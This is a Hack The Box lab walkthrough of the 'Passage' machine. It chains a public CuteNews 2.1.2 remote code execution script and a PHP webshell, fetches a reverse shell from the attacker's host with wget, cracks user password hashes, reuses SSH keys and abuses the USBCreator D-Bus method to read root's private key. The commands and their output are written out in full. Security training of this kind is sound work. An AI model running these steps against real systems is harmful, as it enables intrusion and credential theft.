# System Information

# System Enumeration
I used threader3000 to scan this system. 

```sh
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.10.10.206
------------------------------------------------------------
Scanning target 10.10.10.206
Time started: 2022-01-03 15:07:35.806003
------------------------------------------------------------
Port 80 is open
Port 22 is open
Port scan completed in 0:00:09.999317
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p80,22 -sV -sC -T4 -Pn -oA 10.10.10.206 10.10.10.206
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p80,22 -sV -sC -T4 -Pn -oA 10.10.10.206 10.10.10.206
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 15:07 EST
Nmap scan report for 10.10.10.206
Host is up (0.028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.61 seconds
------------------------------------------------------------
Combined scan completed in 0:00:21.461394
Press enter to quit...

```



### Port 80

The main page was titled "Passage News" and contained links to different articles. I first noticed the "rss" link in the top right corner. 


![](1.png)

Clicking this link brought be to a directory called /CuteNews/ and shows a text feed of the articles. At this point I also added passage.htb to /etc/hosts with the following line.

```sh
10.10.10.206	passage.htb
```

![](2.png)

Looking into what an rss feed is [Wikipedia](https://en.wikipedia.org/wiki/RSS) had an entry that states:
>RSS is a web feed that allows users and applications to access updates to websites in a standardized, computer readable format.

I tried to run feroxbuster, forgetting that fail2ban had been implemented (it was a headline on the main page), and had to reset the box. 


I used searchsploit to look for public exploits on CuteNews and I found a bunch of entries. I took a look around at some source code on the website but was unable to see a version. There is a [link](https://cutephp.com/) to the CuteNews website on the bottom of the main page, this brings up an option to download version 2.1.2. Looking at the github page for the project, CuteNews version 2.0.1 was released on 9/17/2013. There is a date of 2020 at the bottom of the page, it is very likely that this website is using at least version 2.0.1 if not the latest, 2.1.2.

![](3.png)

```sh
kali@kali-[~/boxes/htb/passage]$searchsploit cutenews
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
.....
CuteNews 2.0.3 - Arbitrary File Upload                                  | php/webapps/37474.txt
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)            | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                                | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                    | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                                  | php/webapps/48800.py
.....
```



48800.py looks like it might be a good start, this is on the latest version. Breaking down the script it does a few things, first it registers a new user. Then using this user account it uploads an avatar for the user, but the avatar is a php file containing our payload, in this case a web shell. The first section of the send_payload function creates the php file containing the webshell and POSTS it to /CuteNews/index.php.


![](4.png)

The second part of this function asks the user for a command and sends that to the webshell, returning the output.


![](5.png)


Running the script successfully granted me a webshell.

```sh
kali@kali-[~/boxes/htb/passage]$python3 48800.py 



           _____     __      _  __                     ___   ___  ___
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
                                ___  _________
                               / _ \/ ___/ __/
                              / , _/ /__/ _/
                             /_/|_|\___/___/




[->] Usage python3 expoit.py

Enter the URL> http://passage.htb
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: SNrW4kPF09 and password: SNrW4kPF09

=======================================================
Sending Payload
=======================================================
signature_key: 0be16f88e337e48629763f1ef1c250e2-SNrW4kPF09
signature_dsi: 23c890e581e6a65b8cbf13da619d6f4a
logged in user: SNrW4kPF09
============================
Dropping to a SHELL
============================

command > whoami
www-data
```

At this point the webshell has been uploaded, and I could use the webshell directly instead of the script. In this output we see what the logged_user variable is: "SNrW4kPF09". The following line in the python script shows the location of the webshell.



```sh
        output = sess.post(f"{ip}/CuteNews/uploads/avatar_{logged_user}_{logged_user}.php", data=postdata)

```



Using curl I can access the webshell outside of the python script. I was just showing this as an example, I will be using this python script for the rest.

```sh
kali@kali-[~/boxes/htb/passage]$curl -i http://passage.htb/CuteNews/uploads/avatar_SNrW4kPF09_SNrW4kPF09.php -X POST -d "cmd=whoami"
HTTP/1.1 200 OK
Date: Mon, 03 Jan 2022 20:47:27 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 15
Content-Type: text/html; charset=UTF-8

GIF8;
www-data
```


Looking at the current directory, I should be able to upload a reverse php shell here using the webshell, then access it. 

```sh
command > pwd
/var/www/html/CuteNews/uploads

command > ls -al
total 24
drwxrwxrwx 2 www-data www-data 4096 Jan  3 12:50 .
drwxrwxr-x 9 www-data www-data 4096 Jun 18  2020 ..
-rw-r--r-- 1 www-data www-data   39 Jan  3 12:50 avatar_MKr6TrAp8f_MKr6TrAp8f.php
-rw-r--r-- 1 www-data www-data   39 Jan  3 12:37 avatar_SNrW4kPF09_SNrW4kPF09.php
-rw-r--r-- 1 www-data www-data 1115 Aug 31  2020 avatar_egre55_ykxnacpt.php
-rw-r--r-- 1 www-data www-data 1116 Aug 31  2020 avatar_hacker_jpyoyskt.php
```

I copied the default php reverse shell on kali (found in /usr/share/webshells/php/) and edited the following lines to my HTB ip and port 443

![](6.png)

I used wget through the python script to download the file. I hosted the file on a python http server.

```sh
kali@kali-[~/boxes/htb/passage]$python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.206 - - [03/Jan/2022 15:54:44] "GET /rev.php HTTP/1.1" 200 -

```


```sh
command > wget http://10.10.14.20/rev.php


command > ls
avatar_MKr6TrAp8f_MKr6TrAp8f.php
avatar_SNrW4kPF09_SNrW4kPF09.php
avatar_egre55_ykxnacpt.php
avatar_hacker_jpyoyskt.php
rev.php

```



Visiting the following URL gave me a reverse shell on my netcat listener.

```sh
http://passage.htb/CuteNews/uploads/rev.php
```


![](7.png)



# Shell as www-data

I first check for python and spawned a TTY shell.


```sh
$ which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@passage:/$ 

```


I did some manul enumeration with nothing obvious standing out. I checked for SUID, sudo, access to home directories, and the /opt and /tmp folders. At this point I transferred linpeas to enumerate further.


```sh
kali@kali-[~/tools/priv_esc/PEASS-ng/linPEAS]$python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.206 - - [03/Jan/2022 16:04:25] "GET /linpeas.sh HTTP/1.1" 200 -
```


```sh
www-data@passage:/tmp$ wget http://10.10.14.20/linpeas.sh -O lin.sh
wget http://10.10.14.20/linpeas.sh -O lin.sh
--2022-01-03 13:04:25--  http://10.10.14.20/linpeas.sh
Connecting to 10.10.14.20:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 451118 (441K) [text/x-sh]
Saving to: 'lin.sh'

lin.sh              100%[===================>] 440.54K  1.50MB/s    in 0.3s    

2022-01-03 13:04:26 (1.50 MB/s) - 'lin.sh' saved [451118/451118]
```


I made it executable and ran the script.

```sh
www-data@passage:/tmp$ chmod +x lin.sh
chmod +x lin.sh
www-data@passage:/tmp$ ./lin.sh
```


Linpeas found nothing that I could work with. I spent a while manually enumerating the system, the only files I really had access to was the CuteNews directory. I looked back at the Github page and saw the section show in the image below. So CuteNews does store credentials somewhere, I just need to find them.

![](8.png)


I eventually worked my way into the following directory.

```sh
/var/www/html/CuteNews/cdata/users
```


In here there was a text file called "lines". I shortned the output here. What stood out here was the base64 string, this was the first one that was printed out. 


```sh
www-data@passage:/var/www/html/CuteNews/cdata/users$ cat lines
cat lines
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJhZG1pbiI7YTo4OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMDQ3IjtzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MzoiYWNsIjtzOjE6IjEiO3M6NToiZW1haWwiO3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjQ6InBhc3MiO3M6NjQ6IjcxNDRhOGI1MzFjMjdhNjBiNTFkODFhZTE2YmUzYTgxY2VmNzIyZTExYjQzYTI2ZmRlMGNhOTdmOWUxNDg1ZTEiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3OTg4IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=
.....
```


Using Cyberchef to decode this resulted in the following output.

![](9.png)

The section important here is:

```sh
"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1"
```


I also found the password hash for paul, nadav and paul are the two users on the system.


![](10.png)

I used hash-identifier to try to identify the type of hash used here.






I then searched for the SHA modes on hashcat.

```sh
kali@kali-[~/boxes/htb/passage]$hashcat -h | grep SHA
    100 | SHA1                                             | Raw Hash
   1300 | SHA2-224                                         | Raw Hash
   1400 | SHA2-256                                         | Raw Hash
  10800 | SHA2-384                                         | Raw Hash
   1700 | SHA2-512                                         | Raw Hash
  17300 | SHA3-224                                         | Raw Hash
  17400 | SHA3-256                                         | Raw Hash
  17500 | SHA3-384                                         | Raw Hash
  17600 | SHA3-512                                         | Raw Hash
```


Hashcat was able to crack paul's password but not nadav's.

```sh
kali@kali-[~/tools/priv_esc/PEASS-ng/linPEAS]$hashcat -m 1400 -a 0 paul.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

.....

e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: SHA2-256
Hash.Target......: e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb4...7273cd
Time.Started.....: Mon Jan  3 17:39:54 2022 (0 secs)
Time.Estimated...: Mon Jan  3 17:39:54 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   495.7 kH/s (0.46ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: newzealand -> whitetiger

Started: Mon Jan  3 17:39:53 2022
Stopped: Mon Jan  3 17:39:56 2022

```


Using this password I was able to su to paul.

```sh
www-data@passage:/etc/fail2ban/action.d$ su paul
su paul
Password: atlanta1

paul@passage:/etc/fail2ban/action.d$ 
```


# Shell as paul

First thing I did was go to paul's home directory and see what was there. Here I found the user.txt.

```sh
paul@passage:~$ cat user.txt
cat user.txt
e9786632ff09158e300cef3d1f565922
```


I noticed there was a .ssh folder and I grabbed paul's private key.

```sh
paul@passage:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/
+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i
Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt
rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ
.....
-----END RSA PRIVATE KEY-----
```


I then ran linpeas again as paul to see if I got anything new. I also now had persistent access as paul via SSH.

```sh
kali@kali-[~/tools/priv_esc/PEASS-ng/linPEAS]$chmod  600 paul_id 
kali@kali-[~/tools/priv_esc/PEASS-ng/linPEAS]$ssh paul@10.10.10.206 -i paul_id 
The authenticity of host '10.10.10.206 (10.10.10.206)' can't be established.
ECDSA key fingerprint is SHA256:oRyj2rNWOCrVh9SCgFGamjppmxqJUlGgvI4JSVG75xg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.206' (ECDSA) to the list of known hosts.
paul@passage:~$ 
```


Something that stood out to me before, but I was unable to port forward at the time, was that port 631 is listening locally.


```sh
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 ::1:631                 :::*                    LISTEN      - 
```

I used SSH to portward 127.0.0.1:631 on 10.10.10.206 to my port 8000.

```sh
kali@kali-[~/boxes/htb/passage]$ssh -i paul_id -L 8001:127.0.0.1:631 paul@10.10.10.206 
Last login: Mon Jan  3 14:46:34 2022 from 10.10.14.20
paul@passage:~$ 
```

Verifying it worked with netcat, although I didn't get a banner or anything to identify.

```sh
kali@kali-[~/boxes/htb/passage]$nc -nv 127.0.0.1 8001
(UNKNOWN) [127.0.0.1] 8001 (?) open
```


Running an nmap scan shows the service is IPP and CUPS is running.

```sh
kali@kali-[~/boxes/htb/passage]$nmap -sV -sC -p 8001 127.0.0.1
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 17:57 EST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000074s latency).

PORT     STATE SERVICE VERSION
8001/tcp open  ipp     CUPS 2.1
| http-methods: 
|_  Potentially risky methods: PUT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: CUPS/2.1 IPP/2.1
|_http-title: Home - CUPS 2.1.3

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds
```

A quick google search showed this version did not have a public exploit, back to enumeration.

After scanning linpeas a few times, I noticed that paul's id_rsa.pub has nadav@passage at the end of it. It looks like paul copied nadav's SSH keys.

```sh
-rw-r--r-- 1 paul paul 395 Jul 21  2020 /home/paul/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
```

From here I was able to SSH in as nadav. 

```sh
kali@kali-[~/boxes/htb/passage]$ssh nadav@10.10.10.206 -i paul_id 
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nadav@passage:~$ 
```


# Shell as nadav

I ran linpeas again as nadav. I didn't find anything obvious in linpeas output. Searching through nadav's home directory there was a .viminfo file.

```sh
nadav@passage:~$ cat .viminfo
# This viminfo file was generated by Vim 7.4.
# You may edit it if you're careful!

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&AdminIdentities=unix-group:root

# Last Substitute String:
$AdminIdentities=unix-group:sudo

# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g

# Search String History (newest to oldest):
? AdminIdentities=unix-group:root

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:

# File marks:
'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-'  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

> /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
	"	12	7

> /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
	"	2	0
	.	2	0
	+	2	0
```


I did a quick google search and found a few links mentioning priv esc. [This article](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) actually looks like a detailed writeup of this vulnerability from this box. The example screenshot has the same user "nadav".

![](12.png)

In nadav's home directory I created a file called a.txt and echoed a string to it.

```sh
nadav@passage:~$ echo "this is a test" > a.txt

```

Then using the method in the image, I copied the file to the system root.

```sh
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/a.txt /a.txt true
()
```

Confirmation the file was copied.

```sh
nadav@passage:~$ cat /a.txt
this is a test
```


I took a chance and tried to copy root's id_rsa to nadav's home directory. This method worked.

```sh
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/test true
()
```

```sh
nadav@passage:~$ cat test
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAth1mFSVw6Erdhv7qc+Z5KWQMPtwTsT9630uzpq5fBx/KKzqZ
B7G3ej77MN35+ULlwMcpoumayWK4yZ/AiJBm6FEVBGSwjSMpOGcNXTL1TClGWbdE
+WNBT+30n0XJzi/JPhpoWhXM4OqYLCysX+/b0psF0jYLWy0MjqCjCl/muQtD6f2e
jc2JY1KMMIppoq5DwB/jJxq1+eooLMWVAo9MDNDmxDiw+uWRUe8nj9qFK2LRKfG6
U6wnyQ10ANXIdRIY0bzzhQYTMyH7o5/sjddrRGMDZFmOq6wHYN5sUU+sZDYD18Yg
ezdTw/BBiDMEPzZuCUlW57U+eX3uY+/Iffl+AwIDAQABAoIBACFJkF4vIMsk3AcP
.....
```

I created the key file, set permissions and was then able to SSH in as root.

```sh
kali@kali-[~/boxes/htb/passage]$subl root_id
kali@kali-[~/boxes/htb/passage]$chmod 600 root_id
kali@kali-[~/boxes/htb/passage]$ssh root@10.10.10.206 -i root_id 
Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1
root@passage:~# 
```

```sh
root@passage:~# cat root.txt
958f44e1ff4b210f............
```